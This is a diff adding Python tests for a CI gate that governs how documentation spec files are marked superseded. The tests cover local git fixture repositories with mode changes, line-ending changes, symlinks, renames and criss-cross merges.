+    flip = spec(status="superseded")
+    main = {"docs/superpowers/specs/2026-09-06-model-decisions-v4.md": spec(supersedes=P_SPEC), P_SPEC: flip}
+    redundant = f"{P_SPEC}: {REDUNDANT}"
+    for name, merge_base_mode, head_mode, main_mode, text in (
+            ("linear, no mode change", 0o644, 0o644, 0o644, redundant),
+            ("linear, main set +x", 0o644, 0o644, 0o755, redundant),
+            ("linear, both set +x", 0o644, 0o755, 0o755, redundant),
+            ("linear, branch-only +x", 0o644, 0o755, 0o644, redundant)):
+        on_base(repo, {P_SPEC: spec()}, then=lambda root: (root / P_SPEC).chmod(merge_base_mode))
+        r = mode_divergent_pr(repo, {P_SPEC: flip}, {P_SPEC: head_mode}, main, {P_SPEC: main_mode})
+        assert r.returncode == 1 and text in r.stdout and ROUND_EIGHT not in r.stdout, (name, r.stdout)
+        assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, (name, r.stdout)
+    for name, x_mode, y_mode, head_mode, text in (
+            ("criss-cross, merge bases differ, head keeps 755", 0o644, 0o755, 0o755, redundant),
+            ("criss-cross, merge bases both 755 (merge is a no-op)", 0o755, 0o755, 0o755, redundant),
+            ("criss-cross, head mode equals main's", 0o644, 0o755, 0o644, redundant)):
+        on_base(repo, {P_SPEC: spec()})
+        r = crisscross_pr(repo, x_mode, y_mode, {P_SPEC: flip}, head_mode, main, 0o644)
+        assert r.returncode == 1 and text in r.stdout, (name, r.stdout)
+        assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, (name, r.stdout)
+    # main turns P into a symlink whose target text is the flipped P
+    on_base(repo, {P_SPEC: spec()})
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+    write(repo, P_SPEC, flip)
+    _git(repo, "commit", "-q", "-am", "flip P")
+    head = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-q", "main")
+    (repo / P_SPEC).unlink()
+    os.symlink(flip, repo / P_SPEC)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "main: P as a symlink")
+    r = gate(repo, "--pr", _git(repo, "rev-parse", "main"), head, PR_HEAD_REF=RETIRE_BRANCH)
+    assert r.returncode == 1 and redundant in r.stdout, r.stdout
+    _git(repo, "reset", "-q", "--hard", "HEAD~1")   # main back to a regular P before the next fixture writes it
+    # outside the flip: P superseded at the fork, the branch changes only its mode (main's result, rc 0)
+    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: flip, N_SPEC: spec(supersedes=P_SPEC)})
+    r = pr(repo, RETIRE_BRANCH, {}, then=lambda root: (root / P_SPEC).chmod(0o755))
+    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout
+    # absent at the fork, both sides add the identical superseded P: refused by step 5 alone
+    _git(repo, "reset", "-q", "--hard")
+    _git(repo, "checkout", "-q", "main")
+    _git(repo, "rm", "-q", P_SPEC, N_SPEC)
+    _git(repo, "commit", "-q", "-m", "drop P and N")
+    _git(repo, "tag", "-f", "base")
+    r = divergent_pr(repo, RETIRE_BRANCH, {P_SPEC: flip}, {P_SPEC: flip})
+    assert r.returncode == 1 and refusals(r) == [redundant], r.stdout
+
+
+def test_flip_changes_only_the_status_entry_and_hides_no_key(repo):
+    """IMPL-CICD2 R1 F2 (and pass-1 R1 F4, R3 P2-2): the exemption admits a flip whose bytes outside the one physical
+    line holding the frontmatter `status` entry are unchanged, in place, and whose entry line holds no second logical
+    line. At 29314273 `status: superseded\x0cissues: [4242]` (`frontmatter` splits on form feed and U+2028, the strip
+    lambdas blank the whole physical line) and a rewritten body line beginning `status:` rode the flip (rc 0; main
+    refused both by round eight); so did a body `status:` line moved between blank lines, which a check on the
+    status lines' values alone also admits, since it loses position. Each is refused here by round eight. A quoted,
+    spaced or commented value on the entry is the parser's business and passes when only the entry changes. The
+    in-place rule is untouched: at depth one (P with a null pointer) the hidden key is still admitted on this gate as
+    on main (old-behaviour control, recorded, not changed by this exemption)."""
+    n = {N_SPEC: spec(supersedes=P_SPEC)}
+    refused = f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}"
+    p_base, p_head = spec(supersedes=SPEC), flipped_p()
+    entry = lambda doc, old, new: doc.replace(old, new, 1)
+    for base_line, head_line in (("status: approved", "status: superseded"),
+                                 ("status: 'approved'", "status: 'superseded'"),
+                                 ('status: "approved"', 'status: "superseded"'),
+                                 ("status:  approved ", "status:  superseded "),
+                                 ("status: approved", "status: superseded # retired by v3")):
+        on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: entry(p_base, "status: approved", base_line)})
+        r = pr(repo, RETIRE_BRANCH, {**n, P_SPEC: entry(p_head, "status: superseded", head_line)})
+        assert r.returncode == 0 and "spec gate ok" in r.stdout, (base_line, head_line, r.stdout)
+    # the last base above is the plain lineage (Q superseded, P approved naming Q)
+    for head_line in ("status: superseded\x0cissues: [4242]", "status: superseded\u2028issues: [4242]",
+                      "status: superseded\x0c"):
+        r = pr(repo, RETIRE_BRANCH, {**n, P_SPEC: entry(p_head, "status: superseded", head_line)})
+        assert r.returncode == 1 and refused in r.stdout, (head_line, r.stdout)
+        assert "does not change in place" not in r.stdout, (head_line, r.stdout)
+    body = lambda doc, tail: doc.rstrip("\n") + "\n" + tail
+    for base_tail, head_tail, admitted in (("status: body note\n", "status: body note\n", True),
+                                           ("\nA\n\nstatus: body note\n\nB\n", "\nA\n\n\nstatus: body note\nB\n", False),
+                                           ("status: body note\n", "status: SOMETHING ELSE\n", False)):   # each base differs from the last
+        on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: body(p_base, base_tail)})
+        r = pr(repo, RETIRE_BRANCH, {**n, P_SPEC: body(p_head, head_tail)})
+        if admitted:
+            assert r.returncode == 0 and "spec gate ok" in r.stdout, (head_tail, r.stdout)
+        else:
+            assert r.returncode == 1 and refused in r.stdout, (head_tail, r.stdout)
+    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec()})
+    r = pr(repo, RETIRE_BRANCH, {**n, P_SPEC: spec(status="superseded").replace("status: superseded", "status: superseded\x0cissues: [4242]")})
+    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout
+
+
+# Spec 2026-11-01-feat-cicd-001-truthful-redundant-retirement, done_when item 5, step 5 domain rows C1a to C1d, and the
+# #1665 controls (RQ-2, RQ-3). P0 is P's path written approved with `supersedes: null` and retired by N, so no
+# round-eight refusal applies. Fixture placement (#1665 RQ-3): N exists only on main, added there with main's flip of
+# P0; the branch never carries N (with N on the branch, round eight refuses N's new pointer to a spec superseded at
+# the current base, and "no other refusal" would not hold). Each row runs in a fresh fixture repository.
+
+N0_MAIN = {N_SPEC: spec(supersedes=P_SPEC)}
+
+
+def p0(**over) -> str:
+    return spec(supersedes="null", **over)
+
+
+def refusals(r: subprocess.CompletedProcess) -> list[str]:
+    """The refusal lines the gate printed, in order."""
+    return [line[3:] for line in r.stdout.splitlines() if line.startswith(" - ")]
+
+
+def fresh(tmp_path: Path, name: str) -> Path:
+    (tmp_path / name).mkdir()
+    return make_repo(tmp_path / name)
+
+
+def test_redundant_retirement_line_ending_copy_refused(tmp_path):
+    """C1a: P0 approved at the fork; main flips it with LF and adds N; the branch flips it with CRLF, and with CR-only.
+    The text the gate reads is equal, so step 5 refuses with its message and nothing else (main admits each row; at
+    4ef70d89, which compared bytes, each row passed too: IMPL-CICD6 R2 F1). A real merge of main conflicts here, which
+    is why the message promises no merge result."""
+    for name, convert in (("crlf", lambda t: t.replace("\n", "\r\n")), ("cr-only", lambda t: t.replace("\n", "\r"))):
+        repo = fresh(tmp_path, name)
+        on_base(repo, {P_SPEC: p0()})
+        r = divergent_pr(repo, RETIRE_BRANCH, {P_SPEC: convert(p0(status="superseded"))},
+                         {**N0_MAIN, P_SPEC: p0(status="superseded")})
+        assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], (name, r.stdout)
+
+
+def test_redundant_retirement_mode_only_copy_refused(tmp_path):
+    """C1b: P0 approved at the fork at 100644; main flips it and adds N; the branch makes main's byte-identical flip
+    with file mode 100755 (and, reversed, main at 100755 and the branch at 100644). Refused by step 5 alone; main admits
+    both rows. A merge of main keeps the branch's mode, so the file stays in the change."""
+    for name, merge_base_mode, head_mode, main_mode in (("branch +x", 0o644, 0o755, 0o644),
+                                                        ("main +x, branch kept 644", 0o755, 0o644, 0o755)):
+        repo = fresh(tmp_path, name.replace(" ", "-").replace(",", ""))
+        on_base(repo, {P_SPEC: p0()}, then=lambda root: (root / P_SPEC).chmod(merge_base_mode))
+        r = mode_divergent_pr(repo, {P_SPEC: p0(status="superseded")}, {P_SPEC: head_mode},
+                              {**N0_MAIN, P_SPEC: p0(status="superseded")}, {P_SPEC: main_mode})
+        assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], (name, r.stdout)
+
+
+NEAR_COPY = "docs/notes/model-decisions-copy.md"
+
+
+def test_redundant_retirement_absent_at_fork_refused(tmp_path):
+    """C1c: P0 absent at the fork. (1) Main and the branch each add the identical superseded P0 (main adds N too).
+    (2) The same with the branch copy at 100755. (3) A rename of a near-copy onto the path main adds. Near-copy
+    provenance (#1665 RQ-3): NEAR_COPY, a note outside docs/superpowers/specs/ (so its deletion is no spec deletion),
+    is on the base at the fork holding P0's superseded text plus one note line; the branch `git mv`s it onto P0's path
+    and writes main's superseded bytes; main adds P0 with those bytes and edits the note (a real merge reports a
+    rename collision: IMPL-CICD6 R1 F1). Each row is refused by step 5 alone; main admits every row."""
+    flip = p0(status="superseded")
+    repo = fresh(tmp_path, "both-add")
+    r = divergent_pr(repo, RETIRE_BRANCH, {P_SPEC: flip}, {**N0_MAIN, P_SPEC: flip})
+    assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], r.stdout
+    repo = fresh(tmp_path, "both-add-755")
+    r = mode_divergent_pr(repo, {P_SPEC: flip}, {P_SPEC: 0o755}, {**N0_MAIN, P_SPEC: flip}, {})
+    assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], r.stdout
+    repo = fresh(tmp_path, "rename")
+    on_base(repo, {NEAR_COPY: flip + "A note kept beside the copy.\n"})
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+    (repo / P_SPEC).parent.mkdir(parents=True, exist_ok=True)
+    _git(repo, "mv", NEAR_COPY, P_SPEC)
+    write(repo, P_SPEC, flip)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "move the copy onto P0")
+    head = _git(repo, "rev-parse", "HEAD")
+    assert "R" in _git(repo, "diff", "--name-status", "-M", "base", head).split()[0]
+    on_base(repo, {**N0_MAIN, P_SPEC: flip, NEAR_COPY: flip + "A note main edited.\n"})
+    r = gate(repo, "--pr", _git(repo, "rev-parse", "base"), head, PR_HEAD_REF=RETIRE_BRANCH)
+    assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], r.stdout
+
+
+def test_edit_of_spec_superseded_at_fork_keeps_main_verdict(tmp_path):
+    """C1d: the merge base already holds P0 superseded (N on the base names it), so the change carries no retirement
+    and main's verdict stands (step 6): a CRLF relabel, a branch-only chmod, and the identical chmod on both sides are
+    admitted on main and here, with no step 5 line. The CRLF relabel and identical-chmod rows are refused with the step
+    5 message by a gate that drops the merge-base condition, so they discriminate it (the branch-only chmod row too).
+    The same shapes on a P naming a superseded Q: test_crlf_relabel_of_a_superseded_spec_is_not_called_redundant and
+    test_mode_only_change_of_a_superseded_spec_is_not_called_redundant."""
+    flip = p0(status="superseded")
+    for name, run in (
+            ("crlf relabel", lambda repo: pr(repo, RETIRE_BRANCH, {P_SPEC: flip.replace("\n", "\r\n")})),
+            ("branch-only chmod", lambda repo: pr(repo, RETIRE_BRANCH, {}, then=lambda root: (root / P_SPEC).chmod(0o755))),
+            ("identical chmod on both sides",
+             lambda repo: mode_divergent_pr(repo, {}, {P_SPEC: 0o755}, {"docs/notes/main.md": "main\n"}, {P_SPEC: 0o755}))):
+        repo = fresh(tmp_path, name.replace(" ", "-"))
+        on_base(repo, {**N0_MAIN, P_SPEC: flip})
+        r = run(repo)
+        assert r.returncode == 0 and "spec gate ok" in r.stdout and REDUNDANT not in r.stdout, (name, r.stdout)
+
+
+def test_resave_of_an_approved_spec_is_not_called_redundant(tmp_path):
+    """#1665 RQ-2: step 5 needs the base to hold the spec superseded. An ordinary approved P0, unchanged in text, staged
+    or pushed with CRLF line endings or with mode 100755, is admitted with no new message in commit mode and in PR
+    mode, as on main. A gate that drops the `base status == superseded` condition refuses all four rows with the step 5
+    message (in commit mode `ch.before` is the base, approved, so only that condition keeps it out)."""
+    crlf = {P_SPEC: p0().replace("\n", "\r\n")}
+    chmod = lambda root: (root / P_SPEC).chmod(0o755)
+    for name, files, then in (("crlf", crlf, None), ("chmod", {}, chmod)):
+        repo = fresh(tmp_path, "commit-" + name)
+        on_base(repo, {P_SPEC: p0()})
+        _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+        for path, text in files.items():
+            write(repo, path, text)
+        if then is not None:
+            then(repo)
+        _git(repo, "add", "-A")
+        assert _git(repo, "diff", "--cached", "--name-only") == P_SPEC
+        r = gate(repo, "--commit")
+        assert r.returncode == 0 and REDUNDANT not in r.stdout, (name, r.stdout)
+        repo = fresh(tmp_path, "pr-" + name)
+        on_base(repo, {P_SPEC: p0()})
+        r = pr(repo, RETIRE_BRANCH, files, then=then)
+        assert r.returncode == 0 and "spec gate ok" in r.stdout and REDUNDANT not in r.stdout, (name, r.stdout)
+
+
+def test_redundant_retirement_of_a_spec_draft_or_legacy_at_fork_refused(tmp_path):
+    """#1665 RQ-2, the merge base's "holds another status" branch: P0 is draft at the fork, or a legacy file with no
+    frontmatter there; main retires it (adding N) and the branch writes the identical superseded P0. The change
+    carries the retirement, so step 5 refuses with its message alone; main admits both rows. A gate that reads only
+    "absent at the merge base" admits them."""
+    flip = p0(status="superseded")
+    for name, at_fork in (("draft", p0(status="draft")), ("legacy", "# Model decisions v2\n\nWritten before the gate.\n")):
+        repo = fresh(tmp_path, name)
+        on_base(repo, {P_SPEC: at_fork})
+        r = divergent_pr(repo, RETIRE_BRANCH, {P_SPEC: flip}, {**N0_MAIN, P_SPEC: flip})
+        assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], (name, r.stdout)
